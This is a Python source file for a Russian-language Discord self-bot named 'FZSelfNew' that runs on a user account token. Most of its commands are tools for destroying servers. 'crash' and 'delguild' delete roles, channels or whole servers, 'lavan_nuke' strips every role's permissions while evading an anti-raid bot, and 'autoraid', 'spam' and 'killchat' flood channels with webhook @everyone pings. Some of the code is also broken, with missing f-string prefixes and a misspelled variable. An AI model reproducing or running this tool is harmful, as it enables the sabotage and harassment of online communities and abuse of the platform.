# -*- coding: utf-8 -*-

logo = """

  ______ _______       _____      _  __ _   _               
 |  ____|___  / |     / ____|    | |/ _| \ | |              
 | |__     / /| |    | (___   ___| | |_|  \| | _____      __
 |  __|   / / | |     \___ \ / _ \ |  _| . ` |/ _ \ \ /\ / /
 | |     / /__| |____ ____) |  __/ | | | |\  |  __/\ V  V / 
 |_|    /_____|______|_____/ \___|_|_| |_| \_|\___| \_/\_/  
                                                            
"""
print(logo)

prefix = input(f'\nПрефикс --> ')

import asyncio
import discord
from discord.ext import commands
from random import randint
import time
import requests as rq
import os
import random
from random import choice
from discord import Permissions
# импортируем важные библы

# настройки, не трогаем
crashed = []
v = '1.0.0'
version = 100
url = 'https://github.com/TheBogler/fzlselfnew'

# anti-lavan crash
global channelname,rolename,reasonb
channelname = 'Crashed By FZSelfNews'
rolename = 'Crashed By FZSelfNews'
reasonb = 'Сервер крашнут ботом Anti-Lavan'

helpp = """
`{prefix}getlink` - выдаст ссылку на скачивание файлов селф-бота
`{prefix}say [ текст ]` - отправить сообщение в эмбеде
`{prefix}echo [ текст ]` - отправить сообщение в эмбеде с рандомным цветом
`{prefix}ping` - проверить пинг селф-бота
`{prefix}create_guild [ имя ]` - создать сервер и удалить на нём все каналы
`{prefix}crash` - авто краш сервера
`{prefix}spam [ Текст ]` - бесконечный спам вашим текстом
`{prefix}stop` - остановить спам
`{prefix}spamv2 [ кол-во сообщений ] [ текст ]` - спам текстом
`{prefix}killchat [ кол-во сообщений ]` - засорить чат, так что будет просто черный экран
`{prefix}autoraid` - автоматический рейд сервера
`{prefix}status [ тип статуса ] [ текст ]` - установить статус
`{prefix}hack` - клонирование текущего сервера
`{prefix}popit` - отправить поп ит в чат
`{prefix}ball [ вопрос ]` - задать вопрос магическому шару
`{prefix}lavan_nuke` - краш сервера в обход лавана
`{prefix}kick @пользователь` - кикнуть пользователя с сервера
`{prefix}ban @пользователь` - забанить пользователя на сервере',
"""
#тож не трогаем, проверка обновлений
client = commands.Bot(command_prefix=prefix, intents=discord.Intents.all(), self_bot=True)
# создаем переменную бота
client.remove_command('help')

# эта хрень для спама, не трогать
global spam
spam = True

@client.event
async def on_ready():
	print(f'\n[ FZSelfNew ] Аккаунт загружен | Работаю на клиенте {client.user}')
	print(f'[ FZSelfNew ] Для просмотра списка команд введите {prefix}help')

@client.command()
async def lavan_nuke(ctx):
    for role in ctx.guild.roles:
        try:
            perms = Permissions()
            perms.update(read_messages=False, ban_members=False, kick_members=False, send_messages=False, create_instant_invite=False, administrator=False, manage_channels=False, manage_guild=False, add_reactions=False, view_audit_log=False, priority_speaker=False, stream=False, view_channel=False, send_tts_messages=False, manage_messages=False, embed_links=False, attach_files=False, read_message_history=False, mention_everyone=False, external_emojis=False, use_external_emojis=False, view_guild_insights=False, connect=False, speak=False, mute_members=False, deafen_members=False, move_members=False, use_voice_activation=False, change_nickname=False, manage_nicknames=False, manage_roles=False, manage_permissions=False, manage_webhooks=False, manage_emojis=False, use_slash_commands=False, request_to_speak=False)
            await role.edit(name=rolename, permissions=perms)
        except:
            pass
        else:
            pass

    for channel in ctx.guild.channels:
        try:
            await channel.edit(name=channelname)
        except:
            pass
        else:
            pass

    for ch in ctx.guild.text_channels:
        try:
            h = await ch.create_webhook(name='Crashed')
        except:
            pass

    for i in range(100):
        for channelt in ctx.guild.text_channels:
            hooks = await channelt.webhooks()
            for hook in hooks:
                await hook.send('@everyone @here Данный сервер крашится селф-ботом fzselfbot')


@client.command()
async def kick(ctx, user:discord.Member=None):
	if user == None:
		embed = 'Укажите пользователя для кика!',
		await ctx.send(embed)
	else:
		try:
			await ctx.guild.kick(user)
		except:
			embed="Я не смог кикнуть, возможно нет прав."
		else:
			embed='Кик :boot: Пользователь `{user}` был кикнут'

		await ctx.send(embed)

@client.command()
async def ban(ctx, user:discord.Member=None):
	if user == None:
		embed = 'Укажите пользователя для бана!',
		await ctx.send(embed)
	else:
		try:
			await ctx.guild.ban(user)
		except:
			embed="Я не смог забанить, возможно нет прав."
		else:
			embed = 'Кик :boot: Пользователь `{user}` был кикнут'

		await ctx.send(embed)

@client.command()
async def help(ctx):
	embed = helpp
	await ctx.send(embed)

@client.command()
async def getlink(ctx):
	embed = helpp
	await ctx.send(embed)

@client.command()
async def say(ctx, *, text=''):
	if text == '':
		msg = await ctx.send(f'Укажите текст!')
		time.sleep(1)
		await msg.delete()
		await ctx.message.delete()
	else:
		await ctx.message.delete()
		await ctx.send(text)

@client.command()
async def ping(ctx):
	await ctx.send(":ping_pong: Понг! \n Задержка API - {round(client.latency * 1000)}")

@client.command()
async def create_guild(ctx, *, nameg='NewServer'):
	new = await client.create_guild(name=nameg)
	listc = await new.fetch_channels()
	for c in listc:
		await c.delete()

	await new.create_text_channel('NewServer')

	embed = "Готово :white_check_mark: "
	await ctx.send(embed)

@client.command()
async def crash(ctx):
	await ctx.guild.edit(name='Crashed by FZSelfNew')
	for r in ctx.guild.roles:
		try:
			await r.delete()
		except:
			pass


	for c in ctx.guild.channels:
		try:
			await c.delete()
		except:
			pass

	for i in range(50):
		await ctx.guild.create_role(name='Crashed by FZSelfNew')
		ch = await ctx.guild.create_text_channel('crash-by-fzselfnew')
		await ch.create_webhook(name='crash4d')

@client.event
async def on_guild_channel_create(channel):
	if channel.name == 'crash-by-fzselfnew':
		for i in range(100):
			hooks = await channel.webhooks()
			for hook in hooks:
				await hook.send('@everyone @here Данный сервер крашится селф-ботом fzselfbot')


@client.command()
async def delguild(ctx):
	try:
		await ctx.guild.delete()
	except Exception as e:
		embed = "Ошибка :x: | Произошла ошибка при удалении сервера | `{e}`"
		await ctx.send(embed)

@client.command()
async def spam(ctx, *, text=None):
	embederr = "Ошибка :x: | Укажите текст."
	embed = 'Успешно :white_check_mark: | Спам запущен! Для остановки напишите {prefix}stop'
	if text == None:
		await ctx.send(embederr)
	else:
		global spam
		spam = True
		while spam:
			await ctx.send(text)

@client.command()
async def stop(ctx):
	global spam
	spam = False
	await ctx.message.add_reaction('✅')

@client.command()
async def spamv2(ctx, num=0, *, text=''):
	if num == 0 or text in ['']:
		await ctx.send(f'Правильное использование команды: `{prefix}spamv2 [ кол-во сообщений ] [ текст ]`')
	else:
		for spam in range(int(num)):
			await ctx.send(f'{text}\n||{randint(0,1000000000)}||')

@client.command()
async def killchat(ctx, count=5):
	for i in range(int(count)):
		text = f'||{randint(0,1918177181)}|| die...:hot_face: :hot_face: \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\ndie...:hot_face: :hot_face:'
		await ctx.send(text)
	await ctx.message.delete()

async def sendhook(ctx, channelm):
		for i in range(100):
			hooks = await channelm.webhooks()
			for hook in hooks:
				await hook.send('@everyone @here raid by FZSelfNew!')

@client.command()
async def autoraid(ctx):
	await ctx.message.delete()
	for i in range(6):
		text = f'{randint(0,999)} | Raid by FZSelfNew! @everyone @here\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n||{randint(0,1338)}||'
		await ctx.send(text)
	for c in ctx.guild.text_channels:
		try:
			await c.create_webhook(name="Raid By FZSelfNew")
		except Exception as e:
			print(e)

	try:
			for c in ctx.guild.text_channels:
				asyncio.create_task(sendhook(ctx, channelm=c))
				hooks = await c.webhooks()
				for hook in hooks:
					await hook.send(f'{randint(0,999)} | Raid by FZSelfNew! @everyone @here')
	except Exception as e:
			print(e)

	for c in ctx.guild.text_channels:
		try:
			await c.send(f'{randint(0,999)} | Raid by FZSelfBot! @everyone @here\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n||{randint(0,1338)}||')
		except:
			pass

@client.command()
async def status(ctx, arg='', *, names=''):
    bll = [''] # не смейтесь ебать, просто not == '' не работало, а искать решение лень
    if arg == 'stream' and names not in bll:
        await client.change_presence(activity=discord.Streaming(name=names, url='https://twitch.tv/404'))
        await ctx.message.add_reaction('✅')
    elif arg == 'watch' and names not in bll:
        await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=names))
        await ctx.message.add_reaction('✅')
    elif arg == 'listen' and names not in bll:
        await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=names))
        await ctx.message.add_reaction('✅')
    elif arg == 'play' and names not in bll:
        await client.change_presence(activity=discord.Game(name=names))
        await ctx.message.add_reaction('✅')
    else:
    	embed = "`stream` - стрим статус\n`watch` - статус смотрит\n`listen` - статус слушает\n`play` - статус играет'"
    	await ctx.send(embed)

class console():
	def log(text):
		print(f'[{time.strftime("%H:%M:%S")}] {text}')
	def debug(text):
		print(f'[{time.strftime("%H:%M:%S")}] [ОТЛАДКА] {text}')


#cтарый код матвея, досихпор работает
@client.command()
async def hack(ctx):
	if not ctx.guild: return
	timel = time.time()
	guild = ctx.guild
	msglog=ctx.message
	console.log(f'Начинаю клонирование сервера {guild.name}...')
	icon_hash = guild.icon
	with open('clone_icon.png', 'wb+') as handle:
		handle.write(rq.get(f'https://cdn.discordapp.com/icons/{guild.id}/{icon_hash}.png').content)
	new_guild = await client.create_guild(name=guild.name, icon=open('clone_icon.png', 'rb').read())
	for channel in new_guild.channels:
		try:
			await chennel.delete()
		except:
			pass
	roles = {}
	r = guild.roles
	r.reverse()
	for role in r:
		if role.is_bot_managed() or role.is_default() or role.is_integration() or role.is_premium_subscriber(): continue
		new_role=await new_guild.create_role(name=role.name, permissions=role.permissions, color=role.color, hoist=role.hoist, mentionable=role.mentionable)
		roles[role] = new_role
	everyone = guild.default_role
	roles[everyone] = new_guild.default_role
	await new_guild.default_role.edit(permissions=everyone.permissions, color=everyone.color, hoist=everyone.hoist, mentionable=everyone.mentionable)

	console.log(f'Создание ролей завершено, начинаю создание каналов')
	for dc in await new_guild.fetch_channels():
		await dc.delete()
	channels = {None: None}
	for cat in guild.categories:
		new_c = await new_guild.create_category(name=cat.name, position=cat.position)
		channels[cat] = new_c
	for catt in guild.by_category():
		cat = catt[0]
		chs = catt[1]
		if cat != None:
			for c in chs:
				if c.type==discord.ChannelType.text:
					new_c = await new_guild.create_text_channel(name=c.name, category=channels[c.category], position=c.position, topic=c.topic, slowmode_delay=c.slowmode_delay, nsfw=c.nsfw)
				elif c.type==discord.ChannelType.voice:
					new_c = await new_guild.create_voice_channel(name=c.name, category=channels[c.category], position=c.position, user_limit=c.user_limit)
				elif c.type==discord.ChannelType.news:
					new_c = await new_guild.create_text_channel(name=c.name, category=channels[c.category], position=c.position, topic=c.topic, slowmode_delay=c.slowmode_delay, nsfw=c.nsfw)
				channels[c] = new_c
		else:
			for c in chs:
				if c.type==discord.ChannelType.text:
					new_c = await new_guild.create_text_channel(name=c.name, category=None, position=c.position, topic=c.topic, slowmode_delay=c.slowmode_delay, nsfw=c.nsfw)
				elif c.type==discord.ChannelType.voice:
					new_c = await new_guild.create_voice_channel(name=c.name, category=None, position=c.position, user_limit=c.user_limit)
				elif c.type==discord.ChannelType.news:
					new_c = await new_guild.create_text_channel(name=c.name, category=None, position=c.position, topic=c.topic, slowmode_delay=c.slowmode_delay, nsfw=c.nsfw)
				channels[c] = new_c
	console.log(f'Создание каналов завершено, начинаю настройку оверврайтов')
	for c in guild.channels:
		overs = c.overwrites
		over_new = {}
		for target,over in overs.items():
			if isinstance(target, discord.Role):
				try:
					over_new[roles[target]] = over
				except:
					pass
			else:
				console.debug(f'(OVERWRITES) Пропускаю {target.name}, так как это юзер')
		await channels[c].edit(overwrites=over_new)
	await new_guild.edit(verification_level=guild.verification_level, default_notifications=guild.default_notifications, explicit_content_filter=guild.explicit_content_filter, system_channel=channels[guild.system_channel], system_channel_flags=guild.system_channel_flags, afk_channel=channels[guild.afk_channel], afk_timeout=guild.afk_timeout)#это не оверврайт, но лучше его делать перед эмодзи
	console.log(f'Настройка оверврайтов завершена, начинаю создание эмодзи...')
	countem = 0
	for emoji in guild.emojis:
		try:
			if int(countem) == 50:
				break
			else:
				url = f'https://cdn.discordapp.com/emojis/{emoji.id}.{"gif" if emoji.animated else "png"}'
				await new_guild.create_custom_emoji(name=emoji.name, image=rq.get(url).content)
				countem +=1
		except:
			print('не могу скопировать эмодзю')
			break
	os.remove('clone_icon.png')
	times = int(time.time() - timel)
	console.log(f'Завершено клонирование сервера. Операция заняла {times} сек.')
@client.command()
async def popit(ctx):
	embed = "||:white_large_square:|| ||:white_large_square:|| ||:white_large_square:|| ||:white_large_square:|| ||:white_large_square:||\n||:blue_square:|| ||:blue_square:|| ||:blue_square:|| ||:blue_square:|| ||:blue_square:||\n||:green_square:|| ||:green_square:|| ||:green_square:|| ||:green_square:|| ||:green_square:||\n||:red_square:|| ||:red_square:|| ||:red_square:|| ||:red_square:|| ||:red_square:||\n||:yellow_square:|| ||:yellow_square:|| ||:yellow_square:|| ||:yellow_square:|| ||:yellow_square:||"
	msgg = await ctx.send(embed)

with open('token.txt', 'r') as f:
	tkn = f.read()
client.run(tkn, bot=False)
